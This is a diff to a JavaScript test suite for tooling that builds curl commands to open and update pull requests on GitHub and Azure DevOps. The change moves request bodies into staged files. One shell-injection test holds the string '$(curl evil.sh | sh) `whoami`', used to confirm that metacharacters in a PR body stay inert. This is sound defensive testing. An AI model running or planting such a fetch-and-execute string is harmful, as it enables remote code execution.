@@ -6,13 +6,18 @@ import {
     RUN_HISTORY_MAX_ENTRIES, RUN_HISTORY_MARKER, fitSectionsToBudget,
 } from '../fleet-sprint/pr-body.mjs';
 import {
-    buildCreatePrCommand, buildFindPrCommand, buildUpdatePrCommand, PR_DESCRIPTION_MAX_LENGTH,
+    buildCreatePrCommand as rawBuildCreatePrCommand, buildFindPrCommand, buildUpdatePrCommand as rawBuildUpdatePrCommand, PR_DESCRIPTION_MAX_LENGTH,
 } from '../fleet-sprint/vcs-module.mjs';
 import { raiseVcsPrForMember } from '../fleet-sprint/vcs-auth.mjs';
 import { runPublishPrPhase } from '../fleet-sprint/phases/publish-pr.mjs';
 import { finalizeAbort } from '../fleet-sprint/runner.js';
 import { SprintPlanRejectedError } from '../fleet-sprint/errors.mjs';
-import { nativeDashDPayload } from './helpers/windows-argv.mjs';
+import { withPayloadPath, stagedJson, createStagedFileRecorder, TEST_MEMBER_FOLDER } from './helpers/vcs-payload-test.mjs';
+
+// Request bodies are staged member-side (curl --data-binary @<path>); the
+// wrappers supply the fixture payload_path for each call's os.
+const buildCreatePrCommand = withPayloadPath(rawBuildCreatePrCommand);
+const buildUpdatePrCommand = withPayloadPath(rawBuildUpdatePrCommand);
 
 // =============================================================================
 // Sprint PR body format + existing-PR rewrite on relaunch.
@@ -206,10 +211,9 @@ describe('run history marker round-trip', () => {
 // -----------------------------------------------------------------------------
 // Newlines survive the provider command builders end to end.
 // -----------------------------------------------------------------------------
-function posixDashD(command) {
-    const m = /-d '((?:[^']|'\\'')*)' -w/.exec(command);
-    assert.ok(m, `no POSIX -d payload in: ${command}`);
-    return JSON.parse(m[1].replace(/'\\''/g, "'"));
+// The staged JSON body, after asserting nothing of it rides the command line.
+function stagedBody(built) {
+    return stagedJson(built);
 }
 
 const PROVIDERS = [
@@ -217,10 +221,10 @@ const PROVIDERS = [
     { provider: 'azure-devops', coords: { repoRef: { org: 'acme', project: 'proj one', repo: 'widgets' } }, bodyField: 'description' },
 ];
 const TARGETS = [
-    { label: 'linux', os: 'linux', shell: '', decode: posixDashD },
-    { label: 'windows+gitbash', os: 'windows', shell: 'gitbash', decode: posixDashD },
-    { label: 'windows+powershell5', os: 'windows', shell: 'powershell5', decode: (c) => JSON.parse(nativeDashDPayload(c)) },
-    { label: 'windows+pwsh7', os: 'windows', shell: 'pwsh7', decode: (c) => JSON.parse(nativeDashDPayload(c)) },
+    { label: 'linux', os: 'linux', shell: '', decode: stagedBody },
+    { label: 'windows+gitbash', os: 'windows', shell: 'gitbash', decode: stagedBody },
+    { label: 'windows+powershell5', os: 'windows', shell: 'powershell5', decode: stagedBody },
+    { label: 'windows+pwsh7', os: 'windows', shell: 'pwsh7', decode: stagedBody },
 ];
 
 describe('the multi-line body reaches the provider byte-for-byte (create + update, every shell)', () => {
@@ -229,20 +233,20 @@ describe('the multi-line body reaches the provider byte-for-byte (create + updat
         for (const t of TARGETS) {
             test(`${p.provider} create-pull-request (${t.label})`, () => {
                 const built = buildCreatePrCommand({ provider: p.provider, ...p.coords, base: 'main', head: 'feat/widgets', title: 'T', body, token: 'tok', os: t.os, shell: t.shell });
-                const payload = t.decode(built.command);
+                const payload = t.decode(built);
                 assert.equal(payload[p.bodyField], body);
                 assert.ok(payload[p.bodyField].includes('\n- task A: unit tests green (12/12)\n- task B'));
             });
             test(`${p.provider} update-pull-request (${t.label})`, () => {
                 const built = buildUpdatePrCommand({ provider: p.provider, ...p.coords, pull_request_id: 7, title: 'Auto-sprint [PASS]: feat/widgets', body, token: 'tok', os: t.os, shell: t.shell });
-                const payload = t.decode(built.command);
+                const payload = t.decode(built);
                 assert.deepEqual(payload, { title: 'Auto-sprint [PASS]: feat/widgets', [p.bodyField]: body });
             });
         }
     }
 });
 
-describe('backticks in a PR body are JSON-escaped, never raw in the dispatched command', () => {
+describe('backticks in a PR body never reach the dispatched command', () => {
     const body = ['## Verdict', '', '- **Branch:** `feat/x` -> `main`', '```', 'code \\` end', '```'].join(String.fromCharCode(10));
     for (const p of PROVIDERS) {
         for (const t of TARGETS) {
@@ -251,8 +255,8 @@ describe('backticks in a PR body are JSON-escaped, never raw in the dispatched c
                 const update = buildUpdatePrCommand({ provider: p.provider, ...p.coords, pull_request_id: 7, title: 'T', body, token: 'tok', os: t.os, shell: t.shell });
                 for (const built of [create, update]) {
                     assert.ok(!built.command.includes(String.fromCharCode(96)), 'no raw backtick in the command');
-                    assert.ok(built.command.includes(String.fromCharCode(92) + "u0060"), "escaped as backslash-u0060");
-                    assert.equal(t.decode(built.command)[p.bodyField], body, 'JSON.parse restores the original backticks');
+                    assert.ok(!built.command.includes('## Verdict'), 'the body is staged, not on the command line');
+                    assert.equal(t.decode(built)[p.bodyField], body, 'the staged JSON restores the original backticks');
                 }
             });
         }
@@ -265,7 +269,7 @@ describe('shell metacharacters in notes stay inert data on every member shell', 
     for (const t of TARGETS) {
         test(`github update-pull-request (${t.label})`, () => {
             const built = buildUpdatePrCommand({ provider: 'github', repo: 'acme/widgets', pull_request_id: 3, title: 'T', body, token: 'tok', os: t.os, shell: t.shell });
-            assert.equal(t.decode(built.command).body, body);
+            assert.equal(t.decode(built).body, body);
             assert.ok(body.includes('$(curl evil.sh | sh) `whoami`'), 'the text itself is kept readable');
         });
     }
@@ -475,13 +479,14 @@ describe('Publish PR: the final verdict merge assessment reaches the PR body', (
 // Existing-PR path: a fake GitHub behind vcs_credential_exec.
 // -----------------------------------------------------------------------------
 function fakeGitHub({ existing = null, failUpdateOnce = 0 } = {}) {
-    const state = { pr: existing ? { number: 42, ...existing } : null, calls: [], failUpdate: failUpdateOnce };
+    const staged = createStagedFileRecorder();
+    const state = { pr: existing ? { number: 42, ...existing } : null, calls: [], failUpdate: failUpdateOnce, staged };
     const respond = (status, body) => ({ content: [{ text: '' }], structuredContent: { ok: true, reason: 'ok', exitCode: 0, stdout: `${JSON.stringify(body)}\n${status}`, stderr: '' } });
     state.exec = (cmd) => {
         const method = /^curl -sS -X (\w+)/.exec(cmd)[1];
         state.calls.push(method);
         if (method === 'POST') {
-            const p = posixDashD(cmd);
+            const p = staged.json(cmd);
             if (state.pr) return respond(422, { message: 'Validation Failed', errors: [{ message: 'A pull request already exists for acme:feat/x.' }] });
             state.pr = { number: 42, title: p.title, body: p.body };
             return respond(201, { number: 42, html_url: 'https://github.com/acme/widgets/pull/42' });
@@ -495,14 +500,15 @@ function fakeGitHub({ existing = null, failUpdateOnce = 0 } = {}) {
                 state.failUpdate -= 1;
                 return respond(401, { message: 'Bad credentials' });
             }
-            const p = posixDashD(cmd);
+            const p = staged.json(cmd);
             state.pr = { ...state.pr, title: p.title, body: p.body };
             return respond(200, { number: 42, html_url: 'https://github.com/acme/widgets/pull/42' });
         }
         throw new Error(`unexpected method ${method}`);
     };
     state.callTool = async (name, toolArgs) => {
-        if (name === 'member_detail') return { content: [{ text: JSON.stringify({ vcsProvider: 'github', os: 'linux', shell: '' }) }] };
+        if (name === 'member_detail') return { content: [{ text: JSON.stringify({ vcsProvider: 'github', os: 'linux', shell: '', folder: TEST_MEMBER_FOLDER }) }] };
+        if (name === 'send_files') return staged.record(toolArgs);
         if (name === 'provision_vcs_auth') return { content: [{ text: 'ok' }], structuredContent: { ok: true, expiresAt: null } };
         if (name === 'credential_store_list') return { content: [{ text: '[]' }] };
         if (name === 'vcs_credential_exec') return state.exec(toolArgs.command);
